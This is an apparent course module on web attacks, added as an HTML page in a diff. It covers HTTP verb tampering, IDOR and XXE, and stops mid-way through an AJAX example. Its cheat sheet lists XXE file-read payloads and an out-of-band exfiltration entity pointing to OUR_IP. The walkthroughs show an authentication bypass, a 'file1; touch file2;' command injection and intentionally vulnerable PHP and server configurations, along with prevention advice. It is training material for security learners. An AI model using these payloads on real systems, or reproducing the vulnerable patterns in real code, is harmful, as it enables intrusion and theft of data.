@@ -1,0 +1,1072 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+
+
+
+<h1 id="15-web-attacks">15. Web Attacks</h1>
+<h2 id="-cheat-sheet-"><strong>Cheat Sheet</strong></h2>
+<p>The cheat sheet is a useful command reference for this module.</p>
+<h3 id="http-verb-tampering">HTTP Verb Tampering</h3>
+<p><code>HTTP Method</code></p>
+<ul>
+<li><code>HEAD</code></li>
+<li><code>PUT</code></li>
+<li><code>DELETE</code></li>
+<li><code>OPTIONS</code></li>
+<li><code>PATCH</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-X OPTIONS</code></td>
+<td>Set HTTP Method with Curl</td>
+</tr>
+</tbody>
+</table>
+<h3 id="idor">IDOR</h3>
+<p><code>Identify IDORS</code></p>
+<ul>
+<li>In <code>URL parameters &amp; APIs</code></li>
+<li>In <code>AJAX Calls</code></li>
+<li>By <code>understanding reference hashing/encoding</code></li>
+<li>By <code>comparing user roles</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>md5sum</code></td>
+<td>MD5 hash a string</td>
+</tr>
+<tr>
+<td><code>base64</code></td>
+<td>Base64 encode a string</td>
+</tr>
+</tbody>
+</table>
+<h3 id="xxe">XXE</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Code</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;!ENTITY xxe SYSTEM "http://localhost/email.dtd"&gt;</code></td>
+<td>Define External Entity to a URL</td>
+</tr>
+<tr>
+<td><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code></td>
+<td>Define External Entity to a file path</td>
+</tr>
+<tr>
+<td><code>&lt;!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</code></td>
+<td>Read PHP source code with base64 encode filter</td>
+</tr>
+<tr>
+<td><code>&lt;!ENTITY % error "&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;"&gt;</code></td>
+<td>Reading a file through a PHP error</td>
+</tr>
+<tr>
+<td><code>&lt;!ENTITY % oob "&lt;!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'&gt;"&gt;</code></td>
+<td>Reading a file OOB exfiltration</td>
+</tr>
+</tbody>
+</table>
+<h2 id="introduction-to-web-attacks">Introduction to Web Attacks</h2>
+<hr>
+<p>As web applications are becoming very common and being utilized for most businesses, the importance of protecting them against malicious attacks also becomes more critical. As modern web applications become more complex and advanced, so do the types of attacks utilized against them. This leads to a vast attack surface for most businesses today, which is why web attacks are the most common types of attacks against companies. Protecting web applications is becoming one of the top priorities for any IT department.</p>
+<p>Attacking external-facing web applications may result in compromise of the businesses' internal network, which may eventually lead to stolen assets or disrupted services. It may potentially cause a financial disaster for the company. Even if a company has no external facing web applications, they likely utilize internal web applications, or external facing API endpoints, both of which are vulnerable to the same types of attacks and can be leveraged to achieve the same goals.</p>
+<p>While other HTB Academy modules covered various topics about web applications and various types of web exploitation techniques, in this module, we will cover three other web attacks that can be found in any web application, which may lead to compromise. We will discuss how to detect, exploit, and prevent each of these three attacks.</p>
+<hr>
+<h3 id="web-attacks">Web Attacks</h3>
+<p><strong>HTTP Verb Tampering</strong></p>
+<p>The first web attack discussed in this module is <a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/03-Testing\_for\_HTTP\_Verb\_Tampering">HTTP Verb Tampering</a>. An HTTP Verb Tampering attack exploits web servers that accept many HTTP verbs and methods. This can be exploited by sending malicious requests using unexpected methods, which may lead to bypassing the web application's authorization mechanism or even bypassing its security controls against other web attacks. HTTP Verb Tampering attacks are one of many other HTTP attacks that can be used to exploit web server configurations by sending malicious HTTP requests.</p>
+<p><strong>Insecure Direct Object References (IDOR)</strong></p>
+<p>The second attack discussed in this module is <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/05-Authorization\_Testing/04-Testing\_for\_Insecure\_Direct\_Object\_References">Insecure Direct Object References (IDOR)</a>. IDOR is among the most common web vulnerabilities and can lead to accessing data that should not be accessible by attackers. What makes this attack very common is essentially the lack of a solid access control system on the back-end. As web applications store users' files and information, they may use sequential numbers or user IDs to identify each item. Suppose the web application lacks a robust access control mechanism and exposes direct references to files and resources. In that case, we may access other users' files and information by simply guessing or calculating their file IDs.</p>
+<p><strong>XML External Entity (XXE) Injection</strong></p>
+<p>The third and final web attack we will discuss is <a href="https://owasp.org/www-community/vulnerabilities/XML\_External\_Entity\_\(XXE\">XML External Entity (XXE) Injection</a>_Processing). Many web applications process XML data as part of their functionality. Suppose a web application utilizes outdated XML libraries to parse and process XML input data from the front-end user. In that case, it may be possible to send malicious XML data to disclose local files stored on the back-end server. These files may be configuration files that may contain sensitive information like passwords or even the source code of the web application, which would enable us to perform a Whitebox Penetration Test on the web application to identify more vulnerabilities. XXE attacks can even be leveraged to steal the hosting server's credentials, which would compromise the entire server and allow for remote code execution.</p>
+<p>Let's get started by discussing the first of these attacks in the next section.</p>
+<h2 id="intro-to-http-verb-tampering">Intro to HTTP Verb Tampering</h2>
+<hr>
+<p>The <code>HTTP</code> protocol works by accepting various HTTP methods as <code>verbs</code> at the beginning of an HTTP request. Depending on the web server configuration, web applications may be scripted to accept certain HTTP methods for their various functionalities and perform a particular action based on the type of the request.</p>
+<p>While programmers mainly consider the two most commonly used HTTP methods, <code>GET</code> and <code>POST</code>, any client can send any other methods in their HTTP requests and then see how the web server handles these methods. Suppose both the web application and the back-end web server are configured only to accept <code>GET</code> and <code>POST</code> requests. In that case, sending a different request will cause a web server error page to be displayed, which is not a severe vulnerability in itself (other than providing a bad user experience and potentially leading to information disclosure). On the other hand, if the web server configurations are not restricted to only accept the HTTP methods required by the web server (e.g. <code>GET</code>/<code>POST</code>), and the web application is not developed to handle other types of HTTP requests (e.g. <code>HEAD</code>, <code>PUT</code>), then we may be able to exploit this insecure configuration to gain access to functionalities we do not have access to, or even bypass certain security controls.</p>
+<hr>
+<h3 id="http-verb-tampering">HTTP Verb Tampering</h3>
+<p>To understand <code>HTTP Verb Tampering</code>, we must first learn about the different methods accepted by the HTTP protocol. HTTP has <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">9 different verbs</a> that can be accepted as HTTP methods by web servers. Other than <code>GET</code> and <code>POST</code>, the following are some of the commonly used HTTP verbs:</p>
+<table>
+<thead>
+<tr>
+<th>Verb</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>HEAD</code></td>
+<td>Identical to a GET request, but its response only contains the <code>headers</code>, without the response body</td>
+</tr>
+<tr>
+<td><code>PUT</code></td>
+<td>Writes the request payload to the specified location</td>
+</tr>
+<tr>
+<td><code>DELETE</code></td>
+<td>Deletes the resource at the specified location</td>
+</tr>
+<tr>
+<td><code>OPTIONS</code></td>
+<td>Shows different options accepted by a web server, like accepted HTTP verbs</td>
+</tr>
+<tr>
+<td><code>PATCH</code></td>
+<td>Apply partial modifications to the resource at the specified location</td>
+</tr>
+</tbody>
+</table>
+<p>As you can imagine, some of the above methods can perform very sensitive functionalities, like writing (<code>PUT</code>) or deleting (<code>DELETE</code>) files to the webroot directory on the back-end server. As discussed in the <a href="https://academy.hackthebox.com/course/preview/web-requests">Web Requests</a> module, if a web server is not securely configured to manage these methods, we can use them to gain control over the back-end server. However, what makes HTTP Verb Tampering attacks more common (and hence more critical), is that they are caused by a misconfiguration in either the back-end web server or the web application, either of which can cause the vulnerability.</p>
+<hr>
+<h3 id="insecure-configurations">Insecure Configurations</h3>
+<p>Insecure web server configurations cause the first type of HTTP Verb Tampering vulnerabilities. A web server's authentication configuration may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication. For example, a system admin may use the following configuration to require authentication on a particular web page:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="hljs-tag">&lt;Limit GET POST&gt;</span>
+    Require valid-<span class="hljs-keyword">user</span>
+<span class="hljs-title">&lt;/Limit</span>&gt;
+</code></pre>
+<p>As we can see, even though the configuration specifies both <code>GET</code> and <code>POST</code> requests for the authentication method, an attacker may still use a different HTTP method (like <code>HEAD</code>) to bypass this authentication mechanism altogether, as will see in the next section. This eventually leads to an authentication bypass and allows attackers to access web pages and domains they should not have access to.</p>
+<hr>
+<h3 id="insecure-coding">Insecure Coding</h3>
+<p>Insecure coding practices cause the other type of HTTP Verb Tampering vulnerabilities (though some may not consider this Verb Tampering). This can occur when a web developer applies specific filters to mitigate particular vulnerabilities while not covering all HTTP methods with that filter. For example, if a web page was found to be vulnerable to a SQL Injection vulnerability, and the back-end developer mitigated the SQL Injection vulnerability by the following applying input sanitization filters:</p>
+<p>Code: php</p>
+<pre><code class="lang-php">$pattern = <span class="hljs-string">"/^[A-Za-z\s]+$/"</span><span class="hljs-comment">;</span>
+
+<span class="hljs-keyword">if</span>(preg_match($pattern, $_GET[<span class="hljs-string">"code"</span>])) {
+    $query = <span class="hljs-string">"Select * from ports where port_code like '%"</span> . $_REQUEST[<span class="hljs-string">"code"</span>] . <span class="hljs-string">"%'"</span><span class="hljs-comment">;</span>
+    ...SNIP...
+}
+</code></pre>
+<p>We can see that the sanitization filter is only being tested on the <code>GET</code> parameter. If the GET requests do not contain any bad characters, then the query would be executed. However, when the query is executed, the <code>$_REQUEST["code"]</code> parameters are being used, which may also contain <code>POST</code> parameters, <code>leading to an inconsistency in the use of HTTP Verbs</code>. In this case, an attacker may use a <code>POST</code> request to perform SQL injection, in which case the <code>GET</code> parameters would be empty (will not include any bad characters). The request would pass the security filter, which would make the function still vulnerable to SQL Injection.</p>
+<p>While both of the above vulnerabilities are found in public, the second one is much more common, as it is due to mistakes made in coding, while the first is usually avoided by secure web server configurations, as documentation often cautions against it. In the coming sections, we will see examples of both types and how to exploit them.</p>
+<h2 id="bypassing-basic-authentication">Bypassing Basic Authentication</h2>
+<hr>
+<p>Exploiting HTTP Verb Tampering vulnerabilities is usually a relatively straightforward process. We just need to try alternate HTTP methods to see how they are handled by the web server and the web application. While many automated vulnerability scanning tools can consistently identify HTTP Verb Tampering vulnerabilities caused by insecure server configurations, they usually miss identifying HTTP Tampering vulnerabilities caused by insecure coding. This is because the first type can be easily identified once we bypass an authentication page, while the other needs active testing to see whether we can bypass the security filters in place.</p>
+<p>The first type of HTTP Verb Tampering vulnerability is mainly caused by <code>Insecure Web Server Configurations</code>, and exploiting this vulnerability can allow us to bypass the HTTP Basic Authentication prompt on certain pages.</p>
+<hr>
+<h3 id="identify">Identify</h3>
+<p>When we start the exercise at the end of this section, we see that we have a basic <code>File Manager</code> web application, in which we can add new files by typing their names and hitting <code>enter</code>:</p>
+<p><img src="storage\modules\134\web\_attacks\_verb\_tampering\_add.jpg" alt=""></p>
+<p>However, suppose we try to delete all files by clicking on the red <code>Reset</code> button. In that case, we see that this functionality seems to be restricted for authenticated users only, as we get the following <code>HTTP Basic Auth</code> prompt:</p>
+<p><img src="storage\modules\134\web\_attacks\_verb\_tampering\_reset.jpg" alt=""></p>
+<p>As we do not have any credentials, we will get a <code>401 Unauthorized</code> page:</p>
+<p><img src="storage\modules\134\web\_attacks\_verb\_tampering\_unauthorized.jpg" alt=""></p>
+<p>So, let's see whether we can bypass this with an HTTP Verb Tampering attack. To do so, we need to identify which pages are restricted by this authentication. If we examine the HTTP request after clicking the Reset button or look at the URL that the button navigates to after clicking it, we see that it is at <code>/admin/reset.php</code>. So, either the <code>/admin</code> directory is restricted to authenticated users only, or only the <code>/admin/reset.php</code> page is. We can confirm this by visiting the <code>/admin</code> directory, and we do indeed get prompted to log in again. This means that the full <code>/admin</code> directory is restricted.</p>
+<hr>
+<h3 id="exploit">Exploit</h3>
+<p>To try and exploit the page, we need to identify the HTTP request method used by the web application. We can intercept the request in Burp Suite and examine it: <img src="storage\modules\134\web\_attacks\_verb\_tampering\_unauthorized\_request.jpg" alt="unauthorized\_request"></p>
+<p>As the page uses a <code>GET</code> request, we can send a <code>POST</code> request and see whether the web page allows <code>POST</code> requests (i.e., whether the Authentication covers <code>POST</code> requests). To do so, we can right-click on the intercepted request in Burp and select <code>Change Request Method</code>, and it will automatically change the request into a <code>POST</code> request: <img src="storage\modules\134\web\_attacks\_verb\_tampering\_change\_request.jpg" alt="change\_request"></p>
+<p>Once we do so, we can click <code>Forward</code> and examine the page in our browser. Unfortunately, we still get prompted to log in and will get a <code>401 Unauthorized</code> page if we don't provide the credentials:</p>
+<p><img src="storage\modules\134\web\_attacks\_verb\_tampering\_reset.jpg" alt=""></p>
+<p>So, it seems like the web server configurations do cover both <code>GET</code> and <code>POST</code> requests. However, as we have previously learned, we can utilize many other HTTP methods, most notably the <code>HEAD</code> method, which is identical to a <code>GET</code> request but does not return the body in the HTTP response. If this is successful, we may not receive any output, but the <code>reset</code> function should still get executed, which is our main target.</p>
+<p>To see whether the server accepts <code>HEAD</code> requests, we can send an <code>OPTIONS</code> request to it and see what HTTP methods are accepted, as follows:</p>
+<p>Bypassing Basic Authentication</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -i -X OPTIONS http:/</span><span class="hljs-regexp">/SERVER_IP:PORT/</span>
+
+HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK
+<span class="hljs-string">Date:</span> 
+<span class="hljs-string">Server:</span> Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.41</span> (Ubuntu)
+<span class="hljs-string">Allow:</span> POST,OPTIONS,HEAD,GET
+Content-<span class="hljs-string">Length:</span> <span class="hljs-number">0</span>
+Content-<span class="hljs-string">Type:</span> httpd/unix-directory
+</code></pre>
+<p>As we can see, the response shows <code>Allow: POST,OPTIONS,HEAD,GET</code>, which means that the web server indeed accepts <code>HEAD</code> requests, which is the default configuration for many web servers. So, let's try to intercept the <code>reset</code> request again, and this time use a <code>HEAD</code> request to see how the web server handles it:</p>
+<p><img src="storage\modules\134\web\_attacks\_verb\_tampering\_HEAD\_request.jpg" alt="HEAD\_request"></p>
+<p>Once we change <code>POST</code> to <code>HEAD</code> and forward the request, we will see that we no longer get a login prompt or a <code>401 Unauthorized</code> page and get an empty output instead, as expected with a <code>HEAD</code> request. If we go back to the <code>File Manager</code> web application, we will see that all files have indeed been deleted, meaning that we successfully triggered the <code>Reset</code> functionality without having admin access or any credentials:</p>
+<p><img src="storage\modules\134\web\_attacks\_verb\_tampering\_after\_reset.jpg" alt=""></p>
+<p>Try testing other HTTP methods, and see which ones can successfully bypass the authentication prompt.</p>
+<h2 id="bypassing-security-filters">Bypassing Security Filters</h2>
+<hr>
+<p>The other and more common type of HTTP Verb Tampering vulnerability is caused by <code>Insecure Coding</code> errors made during the development of the web application, which lead to web application not covering all HTTP methods in certain functionalities. This is commonly found in security filters that detect malicious requests. For example, if a security filter was being used to detect injection vulnerabilities and only checked for injections in <code>POST</code> parameters (e.g. <code>$_POST['parameter']</code>), it may be possible to bypass it by simply changing the request method to <code>GET</code>.</p>
+<hr>
+<h3 id="identify">Identify</h3>
+<p>In the <code>File Manager</code> web application, if we try to create a new file name with special characters in its name (e.g. <code>test;</code>), we get the following message:</p>
+<p><img src="storage\modules\134\web\_attacks\_verb\_malicious\_request.jpg" alt=""></p>
+<p>This message shows that the web application uses certain filters on the back-end to identify injection attempts and then blocks any malicious requests. No matter what we try, the web application properly blocks our requests and is secured against injection attempts. However, we may try an HTTP Verb Tampering attack to see if we can bypass the security filter altogether.</p>
+<hr>
+<h3 id="exploit">Exploit</h3>
+<p>To try and exploit this vulnerability, let's intercept the request in Burp Suite (Burp) and then use <code>Change Request Method</code> to change it to another method: <img src="storage\modules\134\web\_attacks\_verb\_tampering\_GET\_request.jpg" alt="unauthorized\_request"></p>
+<p>This time, we did not get the <code>Malicious Request Denied!</code> message, and our file was successfully created:</p>
+<p><img src="storage\modules\134\web\_attacks\_verb\_tampering\_injected\_request.jpg" alt=""></p>
+<p>To confirm whether we bypassed the security filter, we need to attempt exploiting the vulnerability the filter is protecting: a Command Injection vulnerability, in this case. So, we can inject a command that creates two files and then check whether both files were created. To do so, we will use the following file name in our attack (<code>file1; touch file2;</code>):</p>
+<p><img src="storage\modules\134\web\_attacks\_verb\_tampering\_filter\_bypass.jpg" alt=""></p>
+<p>Then, we can once again change the request method to a <code>GET</code> request: <img src="storage\modules\134\web\_attacks\_verb\_tampering\_filter\_bypass\_request.jpg" alt="filter\_bypass\_request"></p>
+<p>Once we send our request, we see that this time both <code>file1</code> and <code>file2</code> were created:</p>
+<p><img src="storage\modules\134\web\_attacks\_verb\_tampering\_after\_filter\_bypass.jpg" alt=""></p>
+<p>This shows that we successfully bypassed the filter through an HTTP Verb Tampering vulnerability and achieved command injection. Without the HTTP Verb Tampering vulnerability, the web application may have been secure against Command Injection attacks, and this vulnerability allowed us to bypass the filters in place altogether.</p>
+<h2 id="verb-tampering-prevention">Verb Tampering Prevention</h2>
+<hr>
+<p>After seeing a few ways to exploit Verb Tampering vulnerabilities, let's see how we can protect ourselves against these types of attacks by preventing Verb Tampering. Insecure configurations and insecure coding are what usually introduce Verb Tampering vulnerabilities. In this section, we will look at samples of vulnerable code and configurations and discuss how we can patch them.</p>
+<hr>
+<h3 id="insecure-configuration">Insecure Configuration</h3>
+<p>HTTP Verb Tampering vulnerabilities can occur in most modern web servers, including <code>Apache</code>, <code>Tomcat</code>, and <code>ASP.NET</code>. The vulnerability usually happens when we limit a page's authorization to a particular set of HTTP verbs/methods, which leaves the other remaining methods unprotected.</p>
+<p>The following is an example of a vulnerable configuration for an Apache web server, which is located in the site configuration file (e.g. <code>000-default.conf</code>), or in a <code>.htaccess</code> web page configuration file:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="hljs-params">&lt;Directory "/var/www/html/admin"&gt;</span>
+    AuthType Basic
+    AuthName <span class="hljs-string">"Admin Panel"</span>
+    AuthUserFile <span class="hljs-meta-keyword">/etc/</span>apache2/.htpasswd
+    <span class="hljs-params">&lt;Limit GET&gt;</span>
+        Require valid-user
+    <span class="hljs-params">&lt;/Limit&gt;</span>
+<span class="hljs-params">&lt;/Directory&gt;</span>
+</code></pre>
+<p>As we can see, this configuration is setting the authorization configurations for the <code>admin</code> web directory. However, as the <code>&lt;Limit GET&gt;</code> keyword is being used, the <code>Require valid-user</code> setting will only apply to <code>GET</code> requests, leaving the page accessible through <code>POST</code> requests. Even if both <code>GET</code> and <code>POST</code> were specified, this would leave the page accessible through other methods, like <code>HEAD</code> or <code>OPTIONS</code>.</p>
+<p>The following example shows the same vulnerability for a <code>Tomcat</code> web server configuration, which can be found in the <code>web.xml</code> file for a certain Java web application:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="hljs-params">&lt;security-constraint&gt;</span>
+    <span class="hljs-params">&lt;web-resource-collection&gt;</span>
+        <span class="hljs-params">&lt;url-pattern&gt;</span><span class="hljs-meta-keyword">/admin/</span>*<span class="hljs-params">&lt;/url-pattern&gt;</span>
+        <span class="hljs-params">&lt;http-method&gt;</span>GET<span class="hljs-params">&lt;/http-method&gt;</span>
+    <span class="hljs-params">&lt;/web-resource-collection&gt;</span>
+    <span class="hljs-params">&lt;auth-constraint&gt;</span>
+        <span class="hljs-params">&lt;role-name&gt;</span>admin<span class="hljs-params">&lt;/role-name&gt;</span>
+    <span class="hljs-params">&lt;/auth-constraint&gt;</span>
+<span class="hljs-params">&lt;/security-constraint&gt;</span>
+</code></pre>
+<p>We can see that the authorization is being limited only to the <code>GET</code> method with <code>http-method</code>, which leaves the page accessible through other HTTP methods.</p>
+<p>Finally, the following is an example for an <code>ASP.NET</code> configuration found in the <code>web.config</code> file of a web application:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml">&lt;system.web&gt;
+    &lt;authorization&gt;
+        &lt;allow verbs=<span class="hljs-string">"<span class="hljs-keyword">GET</span>"</span> roles=<span class="hljs-string">"admin"</span>&gt;
+            &lt;deny verbs=<span class="hljs-string">"<span class="hljs-keyword">GET</span>"</span> users=<span class="hljs-string">"*"</span>&gt;
+        &lt;/deny&gt;
+        &lt;/allow&gt;
+    &lt;/authorization&gt;
+&lt;/system.web&gt;
+</code></pre>
+<p>Once again, the <code>allow</code> and <code>deny</code> scope is limited to the <code>GET</code> method, which leaves the web application accessible through other HTTP methods.</p>
+<p>The above examples show that it is not secure to limit the authorization configuration to a specific HTTP verb. This is why we should always avoid restricting authorization to a particular HTTP method and always allow/deny all HTTP verbs and methods.</p>
+<p>If we want to specify a single method, we can use safe keywords, like <code>LimitExcept</code> in Apache, <code>http-method-omission</code> in Tomcat, and <code>add</code>/<code>remove</code> in ASP.NET, which cover all verbs except the specified ones.</p>
+<p>Finally, to avoid similar attacks, we should generally <code>consider disabling/denying all HEAD requests</code> unless specifically required by the web application.</p>
+<hr>
+<h3 id="insecure-coding">Insecure Coding</h3>
+<p>While identifying and patching insecure web server configurations is relatively easy, doing the same for insecure code is much more challenging. This is because to identify this vulnerability in the code, we need to find inconsistencies in the use of HTTP parameters across functions, as in some instances, this may lead to unprotected functionalities and filters.</p>
+<p>Let's consider the following <code>PHP</code> code from our <code>File Manager</code> exercise:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">'filename'</span>])) {
+    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/[^A-Za-z0-9. _-]/'</span>, $_POST[<span class="hljs-string">'filename'</span>])) {
+        system(<span class="hljs-string">"touch "</span> . $_REQUEST[<span class="hljs-string">'filename'</span>]);
+    } <span class="hljs-keyword">else</span> {
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Malicious Request Denied!"</span>;
+    }
+}
+</code></pre>
+<p>If we were only considering Command Injection vulnerabilities, we would say that this is securely coded. The <code>preg_match</code> function properly looks for unwanted special characters and does not allow the input to go into the command if any special characters are found. However, the fatal error made in this case is not due to Command Injections but due to the <code>inconsistent use of HTTP methods</code>.</p>
+<p>We see that the <code>preg_match</code> filter only checks for special characters in <code>POST</code> parameters with <code>$_POST['filename']</code>. However, the final <code>system</code> command uses the <code>$_REQUEST['filename']</code> variable, which covers both <code>GET</code> and <code>POST</code> parameters. So, in the previous section, when we were sending our malicious input through a <code>GET</code> request, it did not get stopped by the <code>preg_match</code> function, as the <code>POST</code> parameters were empty and hence did not contain any special characters. Once we reach the <code>system</code> function, however, it used any parameters found in the request, and our <code>GET</code> parameters were used in the command, eventually leading to Command Injection.</p>
+<p>This basic example shows us how minor inconsistencies in the use of HTTP methods can lead to critical vulnerabilities. In a production web application, these types of vulnerabilities will not be as obvious. They would probably be spread across the web application and will not be on two consecutive lines like we have here. Instead, the web application will likely have a special function for checking for injections and a different function for creating files. This separation of code makes it difficult to catch these sorts of inconsistencies, and hence they may survive to production.</p>
+<p>To avoid HTTP Verb Tampering vulnerabilities in our code, <code>we must be consistent with our use of HTTP methods</code> and ensure that the same method is always used for any specific functionality across the web application. It is always advised to <code>expand the scope of testing in security filters</code> by testing all request parameters. This can be done with the following functions and variables:</p>
+<table>
+<thead>
+<tr>
+<th>Language</th>
+<th>Function</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PHP</td>
+<td><code>$_REQUEST['param']</code></td>
+</tr>
+<tr>
+<td>Java</td>
+<td><code>request.getParameter('param')</code></td>
+</tr>
+<tr>
+<td>C#</td>
+<td><code>Request['param']</code></td>
+</tr>
+</tbody>
+</table>
+<p>If our scope in security-related functions covers all methods, we should avoid such vulnerabilities or filter bypasses.</p>
+<h2 id="intro-to-idor">Intro to IDOR</h2>
+<hr>
+<p><code>Insecure Direct Object References (IDOR)</code> vulnerabilities are among the most common web vulnerabilities and can significantly impact the vulnerable web application. IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If any user can access any resource due to the lack of a solid access control system, the system is considered to be vulnerable.</p>
+<p>Building a solid access control system is very challenging, which is why IDOR vulnerabilities are pervasive. In addition, automating the process of identifying weaknesses in access control systems is also quite difficult, which may lead to these vulnerabilities going unidentified until they reach production.</p>
+<p>For example, if users request access to a file they recently uploaded, they may get a link to it such as (<code>download.php?file_id=123</code>). So, as the link directly references the file with (<code>file_id=123</code>), what would happen if we tried to access another file (which may not belong to us) with (<code>download.php?file_id=124</code>)? If the web application does not have a proper access control system on the back-end, we may be able to access any file by sending a request with its <code>file_id</code>. In many cases, we may find that the <code>id</code> is easily guessable, making it possible to retrieve many files or resources that we should not have access to based on our permissions.</p>
+<hr>
+<h3 id="what-makes-an-idor-vulnerability">What Makes an IDOR Vulnerability</h3>
+<p>Just exposing a direct reference to an internal object or resource is not a vulnerability in itself. However, this may make it possible to exploit another vulnerability: a <code>weak access control system</code>. Many web applications restrict users from accessing resources by restricting them from accessing the pages, functions, and APIs that can retrieve these resources. However, what would happen if a user somehow got access to these pages (e.g., through a shared/guessed link)? Would they still be able to access the same resources by simply having the link to access them? If the web application did not have an access control system on the back-end that compares the user's authentication to the resource's access list, they might be able to.</p>
+<p>There are many ways of implementing a solid access control system for web applications, like having a Role-Based Access Control (<a href="https://en.wikipedia.org/wiki/Role-based\_access\_control">RBAC</a>) system. The main takeaway is that <code>an IDOR vulnerability mainly exists due to the lack of an access control on the back-end</code>. If a user had direct references to objects in a web application that lacks access control, it would be possible for attackers to view or modify other users' data.</p>
+<p>Many developers ignore building an access control system; hence, most web applications and mobile applications are left unprotected on the back-end. In such applications, all users may have arbitrary access to all other user's data on the back-end. The only thing stopping users from accessing other user's data would be the front-end implementation of the application, which is designed to only show the user's data. In such cases, manually manipulating HTTP requests may reveal that all users have full access to all data, leading to a successful attack.</p>
+<p>All of this makes IDOR vulnerabilities among the most critical vulnerabilities for any web or mobile application, not only due to exposing direct object references but mainly due to a lack of a solid access control system. Even a basic access control system can be challenging to develop. A comprehensive access control system covering the entire web application without interfering with its functions might be an even more difficult task. This is why IDOR/Access Control vulnerabilities are found even in very large web applications, like <a href="https://infosecwriteups.com/disclose-private-attachments-in-facebook-messenger-infrastructure-15-000-ae13602aa486">Facebook</a>, <a href="https://infosecwriteups.com/add-description-to-instagram-posts-on-behalf-of-other-users-6500-7d55b4a24c5a">Instagram</a>, and <a href="https://medium.com/@kedrisec/publish-tweets-by-any-other-user-6c9d892708e3">Twitter</a>.</p>
+<hr>
+<h3 id="impact-of-idor-vulnerabilities">Impact of IDOR Vulnerabilities</h3>
+<p>As mentioned earlier, IDOR vulnerabilities can have a significant impact on web applications. The most basic example of an IDOR vulnerability is accessing private files and resources of other users that should not be accessible to us, like personal files or credit card data, which is known as <code>IDOR Information Disclosure Vulnerabilities</code>. Depending on the nature of the exposed direct reference, the vulnerability may even allow the modification or deletion of other users' data, which may lead to a complete account takeover.</p>
+<p>Once an attacker identifies the direct references, which may be database IDs or URL parameters, they can start testing specific patterns to see whether they can gain access to any data and may eventually understand how to extract or modify data for any arbitrary user.</p>
+<p>IDOR vulnerabilities may also lead to the elevation of user privileges from a standard user to an administrator user, with <code>IDOR Insecure Function Calls</code>. For example, many web applications expose URL parameters or APIs for admin-only functions in the front-end code of the web application and disable these functions for non-admin users. However, if we had access to such parameters or APIs, we may call them with our standard user privileges. Suppose the back-end did not explicitly deny non-admin users from calling these functions. In that case, we may be able to perform unauthorized administrative operations, like changing users' passwords or granting users certain roles, which may eventually lead to a total takeover of the entire web application.</p>
+<h2 id="identifying-idors">Identifying IDORs</h2>
+<hr>
+<h3 id="url-parameters-apis">URL Parameters &amp; APIs</h3>
+<hr>
+<p>The very first step of exploiting IDOR vulnerabilities is identifying Direct Object References. Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. <code>?uid=1</code> or <code>?filename=file_1.pdf</code>). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.</p>
+<p>In the most basic cases, we can try incrementing the values of the object references to retrieve other data, like (<code>?uid=2</code>) or (<code>?filename=file_2.pdf</code>). We can also use a fuzzing application to try thousands of variations and see if they return any data. Any successful hits to files that are not our own would indicate an IDOR vulnerability.</p>
+<hr>
+<h3 id="ajax-calls">AJAX Calls</h3>
+<p>We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.</p>
+<p>For example, if we did not have an admin account, only the user-level functions would be used, while the admin functions would be disabled. However, we may still be able to find the admin functions if we look into the front-end JavaScript code and may be able to identify AJAX calls to specific end-points or APIs that contain direct object references. If we identify direct object references in the JavaScript code, we can test them for IDOR vulnerabilities.</p>
+<p>This is not unique to admin functions, of course, but can also be any functions or calls that may not be found through monitoring HTTP requests. The following example shows a basic example of an AJAX call:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">changeUserPassword</span>(<span class="hljs-params"></span>) </span>{
+    $.ajax({
+        <span class="hljs-attr">url</span>:<span class="hljs-string">"change_password.php"</span>,
+        <span class="hljs-attr">type</span>: <span class="hljs-string">"post"</span>,
+        <span class="hljs-attr">dataType</span>: <span class="hljs-string">"json"</span>,
+        <span class="hljs-attr">data</span>: {<span class="hljs-attr">uid</span>: user.uid, <span class="hljs-attr">password</span>: user.password, <span class="hljs-attr">is_admin</span>: is_admin},
